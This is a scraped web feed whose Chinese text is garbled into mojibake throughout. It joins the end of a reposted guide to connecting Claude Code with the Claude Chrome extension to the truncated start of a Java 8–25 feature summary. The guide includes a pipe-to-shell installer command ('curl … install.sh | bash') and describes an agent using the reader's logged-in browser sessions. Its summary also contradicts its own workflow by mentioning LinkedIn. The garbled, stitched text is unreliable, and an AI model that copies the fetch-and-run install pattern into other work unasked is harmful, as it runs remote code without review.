                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.reddit.com%2Fr%2FClaudeAI%2Fcomments%2F1i4t6g9%2Fspent_this_weekend_with_claude_code_chrome%2F" target="_blank" title="https://www.reddit.com/r/ClaudeAI/comments/1i4t6g9/spent_this_weekend_with_claude_code_chrome/" ref="nofollow noopener noreferrer">è½¬è½½</a></p>
<p>è¿™ä¸ªå‘¨æœ«æˆ‘ä¸€ç›´åœ¨ä½¿ç”¨ Claude Code + Claude Chrome é›†æˆã€‚å®ƒçœŸçš„è®©æˆ‘æƒŠå¹ã€‚æˆ‘æƒ³åœ¨ä½¿ç”¨å®ƒçš„åŒæ—¶åˆ†äº«è¿™ä¸ªå¿«é€Ÿè®¾ç½®æŒ‡å—ã€‚</p>
<h2 data-id="heading-0">å®ƒå®é™…åšä»€ä¹ˆ</h2>
<p>Claude Codeï¼ˆç»ˆç«¯ç‰ˆï¼‰è¿æ¥åˆ° Claude Chrome æµè§ˆå™¨æ‰©å±•ã€‚æ‰€ä»¥ä½ å¯ä»¥åœ¨ç»ˆç«¯ä¸­å†™ä»£ç ï¼Œç„¶åè®© Claude åœ¨ Chrome ä¸­æ‰“å¼€å®ƒï¼Œè¯»å–æ§åˆ¶å°é”™è¯¯ï¼Œç‚¹å‡»æ“ä½œï¼Œå¹¶ä¿®å¤ä»£ç ã€‚æ‰€æœ‰è¿™äº›éƒ½ä¸éœ€è¦å¤åˆ¶ç²˜è´´ä»»ä½•ä¸œè¥¿ã€‚</p>
<p>ç°åœ¨ Claude å¯ä»¥ï¼š</p>
<ul>
<li>åœ¨æµè§ˆå™¨ä¸­æ‰“å¼€ URL</li>
<li>ç‚¹å‡»æŒ‰é’®ã€å¡«å†™è¡¨å•</li>
<li>è¯»å–æ§åˆ¶å°é”™è¯¯å’Œ DOM çŠ¶æ€</li>
<li>æˆªå›¾å’Œå½•åˆ¶ GIF</li>
<li>ä½¿ç”¨ä½ ç°æœ‰çš„ç™»å½•ä¿¡æ¯å¤„ç†éœ€è¦è®¤è¯çš„ç½‘ç«™ï¼ˆGmailã€Notionã€Sheetsï¼‰</li>
</ul>
<p>ä¸éœ€è¦ APIã€‚ä¸éœ€è¦ tokenã€‚åªéœ€è¦ä½ çš„æµè§ˆå™¨ä¼šè¯ã€‚</p>
<h2 data-id="heading-1">å‰ç½®è¦æ±‚</h2>
<p>åœ¨å¼€å§‹ä¹‹å‰ï¼Œä½ éœ€è¦ï¼š</p>
<ul class="contains-task-list">
<li class="task-list-item"><input type="checkbox" disabled="disabled"/> Google Chrome æµè§ˆå™¨</li>
<li class="task-list-item"><input type="checkbox" disabled="disabled"/> ä»˜è´¹ Claude è´¦æˆ·ï¼ˆProã€Team æˆ– Enterpriseï¼‰</li>
<li class="task-list-item"><input type="checkbox" disabled="disabled"/> Claude in Chrome æµè§ˆå™¨æ‰©å±•ï¼ˆç‰ˆæœ¬ 1.0.36 æˆ–æ›´é«˜ï¼‰</li>
<li class="task-list-item"><input type="checkbox" disabled="disabled"/> Claude Code CLIï¼ˆç‰ˆæœ¬ 2.0.73 æˆ–æ›´é«˜ï¼‰</li>
</ul>
<p>âš ï¸ <strong>Windows ç”¨æˆ·æ³¨æ„</strong>ï¼šWSL ä¸æ”¯æŒ Chrome é›†æˆã€‚è¯·åœ¨å¸¸è§„ Windows ä¸­è¿è¡Œ Claude Codeã€‚</p>
<h2 data-id="heading-2">è®¾ç½®æ­¥éª¤ï¼ˆ5 åˆ†é’Ÿï¼‰</h2>
<h3 data-id="heading-3">æ­¥éª¤ 1ï¼šå®‰è£… Claude Code æˆ–æ›´æ–°</h3>
<p>æ‰“å¼€ç»ˆç«¯å¹¶è¿è¡Œï¼š</p>
<pre><code class="hljs language-bash" lang="bash">curl -fsSL https://claude.ai/install.sh | bash
</code></pre>
<p>éªŒè¯å®‰è£…ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">claude --version
</code></pre>
<p>å¦‚æœç‰ˆæœ¬ä¸æ­£ç¡®æˆ–å·²ç»å®‰è£…ï¼Œæ‰§è¡Œæ›´æ–°å‘½ä»¤ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">claude --update
</code></pre>
<h3 data-id="heading-4">æ­¥éª¤ 2ï¼šå®‰è£… Chrome æµè§ˆå™¨æ‰©å±•</h3>
<ol>
<li>æ‰“å¼€ Chrome å¹¶è¿›å…¥ Chrome ç½‘ä¸Šåº”ç”¨åº—</li>
<li>æœç´¢"Claude"æˆ–ä½¿ç”¨ç›´æ¥é“¾æ¥</li>
<li>ç‚¹å‡»"æ·»åŠ åˆ° Chrome"</li>
<li>ç‚¹å‡»å·¥å…·æ ä¸­çš„æ‹¼å›¾å›¾æ ‡ â†’ æ‰¾åˆ° Claude â†’ ç‚¹å‡»å›ºå®š</li>
<li>ç‚¹å‡» Claude å›¾æ ‡å¹¶ä½¿ç”¨ä½ çš„ Claude è´¦æˆ·ç™»å½•</li>
</ol>
<h3 data-id="heading-5">æ­¥éª¤ 3ï¼šè¿æ¥ Claude Code åˆ° Chrome</h3>
<p>åœ¨ç»ˆç«¯ä¸­ï¼Œä½¿ç”¨ chrome æ ‡å¿—è¿è¡Œ Claude Codeï¼š</p>
<pre><code class="hljs language-bash" lang="bash">claude --chrome
</code></pre>
<p><code>--chrome</code> æ ‡å¿—å‘Šè¯‰ Claude Code è¿æ¥åˆ°æµè§ˆå™¨æ‰©å±•ã€‚</p>
<h3 data-id="heading-6">æ­¥éª¤ 4ï¼šéªŒè¯è¿æ¥</h3>
<p>åœ¨ Claude Code å†…éƒ¨ï¼Œè¾“å…¥ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">/chrome
</code></pre>
<p>ä½ åº”è¯¥çœ‹åˆ°ï¼š<code>Chrome integration: Enabled</code>ï¼ˆChrome é›†æˆï¼šå·²å¯ç”¨ï¼‰</p>
<h2 data-id="heading-7">å¿«é€Ÿæµ‹è¯•</h2>
<p>ä½¿ç”¨è¿™ä¸ªæç¤ºè¯æµ‹è¯•ï¼š</p>
<blockquote>
<p>æ‰“å¼€ google.comï¼Œç‚¹å‡»æœç´¢å­—æ®µï¼Œè¾“å…¥"Claude Code tutorial"ï¼Œå‘Šè¯‰æˆ‘å‡ºç°ä»€ä¹ˆè‡ªåŠ¨è¡¥å…¨å»ºè®®ã€‚</p>
</blockquote>
<p>è§‚å¯Ÿ Chrome ä¸­çš„ Claudeï¼š</p>
<ul>
<li>æ‰“å¼€ Google</li>
<li>ç‚¹å‡»æœç´¢å­—æ®µ</li>
<li>è¾“å…¥æŸ¥è¯¢</li>
<li>è¯»å–è‡ªåŠ¨è¡¥å…¨å»ºè®®</li>
</ul>
<p>ç»ˆç«¯å’Œæµè§ˆå™¨å·²è¿æ¥ã€‚</p>
<h2 data-id="heading-8">å¤šç«™ç‚¹è‡ªåŠ¨åŒ–</h2>
<p>æˆ‘éœ€è¦ä½ æ‰§è¡Œä¸€ä¸ªå¤šç«™ç‚¹å·¥ä½œæµç¨‹ï¼š</p>
<ol>
<li>åœ¨ sheets.google.com æ‰“å¼€ Google Sheets</li>
<li>åˆ›å»ºä¸€ä¸ªæ–°çš„ç©ºç™½ç”µå­è¡¨æ ¼</li>
<li>å°†å…¶é‡å‘½åä¸º"Latest AI News"</li>
<li>åœ¨ç¬¬ä¸€è¡Œæ·»åŠ æ ‡é¢˜ï¼šTitleã€URLã€Summary</li>
<li>åœ¨æ–°æ ‡ç­¾é¡µä¸­æ‰“å¼€ Hacker Newsï¼ˆnews.ycombinator.comï¼‰</li>
<li>æå–å‰ 10 ä¸ªæ•…äº‹çš„æ ‡é¢˜å’Œ URL</li>
<li>å°†å®ƒä»¬æ ¼å¼åŒ–ä¸º markdown åˆ—è¡¨</li>
<li>å›åˆ° Google Sheet</li>
<li>ç”¨å®ƒä»¬çš„ä¿¡æ¯æ·»åŠ ä¸ºæ–°è¡Œ</li>
<li>å®Œæˆåå‘Šè¯‰æˆ‘å¹¶ç»™æˆ‘ Sheet URL</li>
</ol>
<p>é€æ­¥å®Œæˆè¿™ä¸ªä»»åŠ¡ã€‚å¦‚æœä½ é‡åˆ°ä»»ä½•ç™»å½•é¡µé¢ï¼Œè®©æˆ‘çŸ¥é“ï¼Œæˆ‘ä¼šå¤„ç†å®ƒä»¬ã€‚</p>
<p><strong>Claude ä¼šåšä»€ä¹ˆ</strong>ï¼šåˆ›å»ºç”µå­è¡¨æ ¼ã€æœç´¢ LinkedInã€æå–æ•°æ®ã€å¡«å……è¡Œã€‚</p>
<p>å…³é”®æ´å¯Ÿï¼šä¸éœ€è¦ APIã€‚Claude ä½¿ç”¨ä½ ç°æœ‰çš„å·²ç™»å½•æµè§ˆå™¨ä¼šè¯ã€‚</p>
<h2 data-id="heading-9">é™åˆ¶</h2>
<p>å½“å‰çº¦æŸï¼š</p>
<ul>
<li>ä»…æ”¯æŒ Chromeï¼ˆä¸æ”¯æŒ Arcã€Firefoxã€Safariï¼‰</li>
<li>Windows ä¸Šä¸æ”¯æŒ WSLï¼ˆå‚è§ä¸‹é¢çš„æ›´æ–°ç¼–è¾‘ï¼‰</li>
<li>æ—  headless æ¨¡å¼ â€” æµè§ˆå™¨å¿…é¡»å¯è§</li>
<li>JavaScript æ¨¡æ€å¯¹è¯æ¡†ï¼ˆalert/confirmï¼‰å¯èƒ½ä¼šä¸­æ–­æµç¨‹</li>
</ul>
<h2 data-id="heading-10">ä¸åº”è¯¥ç”¨äºï¼š</h2>
<p>âŒ é‡‘èäº¤æ˜“
âŒ å¯†ç ç®¡ç†
âŒ æ— äººç›‘ç£çš„ç”Ÿäº§éƒ¨ç½²</p>
<p><strong>è®°ä½</strong>ï¼šClaude ä½¿ç”¨ä½ çš„å·²ç™»å½•ä¼šè¯ã€‚æ— è®ºä½ ç™»å½•ä»€ä¹ˆï¼ŒClaude éƒ½å¯ä»¥è®¿é—®ã€‚è¯·ç›‘ç£å®ƒã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Java 8-25 å„ä¸ªç‰ˆæœ¬æ–°ç‰¹æ€§æ€»ç»“]]></title>    <link>https://juejin.cn/post/7589978645135622154</link>    <guid>https://juejin.cn/post/7589978645135622154</guid>    <pubDate>2026-01-01T14:41:34.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589978645135622154" data-draft-id="7589823928414568474" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Java 8-25 å„ä¸ªç‰ˆæœ¬æ–°ç‰¹æ€§æ€»ç»“"/> <meta itemprop="keywords" content="åç«¯,Java"/> <meta itemprop="datePublished" content="2026-01-01T14:41:34.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ä¸€çº¿å¤§ç "/> <meta itemprop="url" content="https://juejin.cn/user/3280598429340984"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Java 8-25 å„ä¸ªç‰ˆæœ¬æ–°ç‰¹æ€§æ€»ç»“
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3280598429340984/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ä¸€çº¿å¤§ç 
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-01T14:41:34.000Z" title="Thu Jan 01 2026 14:41:34 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-01
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»10åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="a11y-dark">.hljs-comment,.hljs-quote{color:#d4d0ab}.hljs-deletion,.hljs-name,.hljs-regexp,.hljs-selector-class,.hljs-selector-id,.hljs-tag,.hljs-template-variable,.hljs-variable{color:#ffa07a}.hljs-built_in,.hljs-builtin-name,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-type{color:#f5ab35}.hljs-attribute{color:gold}.hljs-addition,.hljs-bullet,.hljs-string,.hljs-symbol{color:#abe338}.hljs-section,.hljs-title{color:#00e0e0}.hljs-keyword,.hljs-selector-tag{color:#dcc6e0}.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#2b2b2b;color:#f8f8f2}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}@media screen and (-ms-high-contrast:active){.hljs-addition,.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-bullet,.hljs-comment,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-quote,.hljs-string,.hljs-symbol,.hljs-type{color:highlight}.hljs-keyword,.hljs-selector-tag{font-weight:700}}</style><p>æœ¬æ–‡æ‰€å†™çš„è¿™å‡ ä¸ª Java ç‰ˆæœ¬å‡ä¸ºé•¿æœŸæ”¯æŒï¼ˆLTSï¼‰ç‰ˆæœ¬ã€‚</p>
<h2 data-id="heading-0">1. Java 8</h2>
<h3 data-id="heading-1">1.1. â€ŒLambda è¡¨è¾¾å¼</h3>
<p>Lambda è¡¨è¾¾å¼å…è®¸ä½ ä»¥ä¸€ç§æ›´ç®€æ´çš„æ–¹å¼è¡¨ç¤ºå‡½æ•°å¼æ¥å£çš„å®ä¾‹ã€‚å®ƒèƒ½å¤Ÿä½¿ä»£ç æ›´åŠ ç®€æ´å’Œæ˜“è¯»ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ç¤ºä¾‹</span>
List&lt;String&gt; names = Arrays.asList(<span class="hljs-string">"Alice"</span>, <span class="hljs-string">"Bob"</span>, <span class="hljs-string">"Charlie"</span>);
names.forEach(name -&gt; System.out.println(name));
</code></pre>
<h3 data-id="heading-2">1.2. å‡½æ•°å¼æ¥å£</h3>
<p>å‡½æ•°å¼æ¥å£æ˜¯åªåŒ…å«ä¸€ä¸ªæŠ½è±¡æ–¹æ³•çš„æ¥å£ï¼Œå¯ä»¥ä½¿ç”¨ <code>@FunctionalInterface</code> æ³¨è§£æ¥æ ‡è¯†ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@FunctionalInterface</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">MyFunctionalInterface</span> {
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">execute</span><span class="hljs-params">()</span>;
}
</code></pre>
<h3 data-id="heading-3">1.3. æ–¹æ³•å¼•ç”¨</h3>
<p>æ–¹æ³•å¼•ç”¨æ˜¯ä¸€ç§æ›´ç®€æ´åœ°è¡¨ç¤º lambda è¡¨è¾¾å¼çš„æ–¹æ³•ã€‚å¯ä»¥ä½¿ç”¨ç±»åæˆ–å¯¹è±¡åæ¥å¼•ç”¨æ–¹æ³•ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ç¤ºä¾‹</span>
List&lt;String&gt; names = Arrays.asList(<span class="hljs-string">"Alice"</span>, <span class="hljs-string">"Bob"</span>, <span class="hljs-string">"Charlie"</span>);
names.forEach(System.out::println);
</code></pre>
<h3 data-id="heading-4">1.4. â€ŒStream API</h3>
<p>Stream API æä¾›äº†ä¸€ç§é«˜æ•ˆå¤„ç†é›†åˆçš„æ–¹å¼ï¼Œé€šè¿‡æµå¼æ“ä½œå¯ä»¥è¿›è¡Œè¿‡æ»¤ã€æ˜ å°„ã€æ’åºç­‰æ“ä½œã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ç¤ºä¾‹</span>
List&lt;String&gt; filteredNames = names.stream()
                                   .filter(name -&gt; name.startsWith(<span class="hljs-string">"A"</span>))
                                   .collect(Collectors.toList());
</code></pre>
<h3 data-id="heading-5">1.5. â€ŒOptional ç±»</h3>
<p>Optional ç±»ç”¨äºé˜²æ­¢ç©ºæŒ‡é’ˆå¼‚å¸¸ï¼Œå®ƒå¯ä»¥åŒ…å«å€¼æˆ–ä¸åŒ…å«å€¼ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ç¤ºä¾‹</span>
Optional&lt;String&gt; optionalName = Optional.ofNullable(<span class="hljs-literal">null</span>);
optionalName.ifPresent(System.out::println); <span class="hljs-comment">// ä¸ä¼šè¾“å‡ºä»»ä½•å†…å®¹</span>
</code></pre>
<h3 data-id="heading-6">1.6. â€Œé»˜è®¤æ–¹æ³•</h3>
<p>æ¥å£å¯ä»¥åŒ…å«é»˜è®¤å®ç°çš„æ–¹æ³•ï¼Œè¿™æ ·å­ç±»å¯ä»¥é€‰æ‹©é‡å†™æˆ–è€…ç›´æ¥ä½¿ç”¨ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">MyInterface</span> {
    <span class="hljs-keyword">default</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">defaultMethod</span><span class="hljs-params">()</span> {
        System.out.println(<span class="hljs-string">"Hello from default method"</span>);
    }
}
</code></pre>
<h3 data-id="heading-7">1.7. â€Œæ–°æ—¥æœŸæ—¶é—´ API</h3>
<p>Java 8 å¼•å…¥äº†æ–°çš„æ—¥æœŸæ—¶é—´ API æ¥æ›¿ä»£æ—§çš„ java.util.Date å’Œ java.util.Calendar ç±»ï¼Œæä¾›æ›´å¥½çš„å¯è¯»æ€§å’Œå¯ç”¨æ€§ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ç¤ºä¾‹</span>
<span class="hljs-type">LocalDate</span> <span class="hljs-variable">today</span> <span class="hljs-operator">=</span> LocalDate.now();
System.out.println(today);
</code></pre>
<h3 data-id="heading-8">1.8. é‡å¤æ³¨è§£</h3>
<p>Java 8 æ”¯æŒåœ¨åŒä¸€ä½ç½®ä¸Šä½¿ç”¨ç›¸åŒç±»å‹çš„æ³¨è§£å¤šæ¬¡ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@MyAnnotation</span>
<span class="hljs-meta">@MyAnnotation</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyClass</span> {
}
</code></pre>
<h2 data-id="heading-9">2. Java 11</h2>
<h3 data-id="heading-10">2.1. â€Œå±€éƒ¨å˜é‡ç±»å‹æ¨æ–­</h3>
<p>å¼•å…¥Â <code>var</code>Â å…³é”®å­—ï¼Œç¼–è¯‘å™¨è‡ªåŠ¨æ¨æ–­å±€éƒ¨å˜é‡ç±»å‹ï¼Œç®€åŒ–ä»£ç ä¹¦å†™ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">var</span> <span class="hljs-variable">list</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;String&gt;();  <span class="hljs-comment">// ç±»å‹è‡ªåŠ¨æ¨æ–­ä¸º ArrayList&lt;String&gt;</span>
<span class="hljs-type">var</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-string">"Java"</span>;                  <span class="hljs-comment">// ç±»å‹è‡ªåŠ¨æ¨æ–­ä¸º String</span>
</code></pre>
<ul>
<li><strong>è¯­æ³•</strong>â€Œï¼š<code>var</code>Â åªèƒ½ç”¨äºå±€éƒ¨å˜é‡ï¼Œç¼–è¯‘å™¨æ ¹æ®åˆå§‹åŒ–å€¼æ¨æ–­ç±»å‹ã€‚</li>
<li>â€Œ<strong>ä¼˜åŠ¿</strong>â€Œï¼šå‡å°‘æ ·æ¿ä»£ç ï¼Œä½†éœ€æ³¨æ„ç±»å‹æ˜ç¡®æ€§ã€‚</li>
<li>â€Œ<strong>é™åˆ¶</strong>â€Œï¼šä¸èƒ½ç”¨äºæ–¹æ³•å‚æ•°ã€è¿”å›å€¼æˆ–ç±»æˆå‘˜å˜é‡ã€‚</li>
</ul>
<h3 data-id="heading-11">2.2. â€Œå­—ç¬¦ä¸²æ–¹æ³•å¢å¼º</h3>
<p>Java 11 å¢åŠ äº†ä¸€äº›æ–°çš„å­—ç¬¦ä¸²æ–¹æ³•ï¼Œæ”¹å–„äº†å­—ç¬¦ä¸²æ“ä½œçš„ä¾¿åˆ©æ€§ã€‚</p>
<ul>
<li>String.isBlank(): åˆ¤æ–­å­—ç¬¦ä¸²æ˜¯å¦ä¸ºç©ºæˆ–ä»…åŒ…å«ç©ºç™½å­—ç¬¦ã€‚</li>
<li>String.lines(): å°†å­—ç¬¦ä¸²æŒ‰è¡Œåˆ†å‰²å¹¶è¿”å›æµã€‚</li>
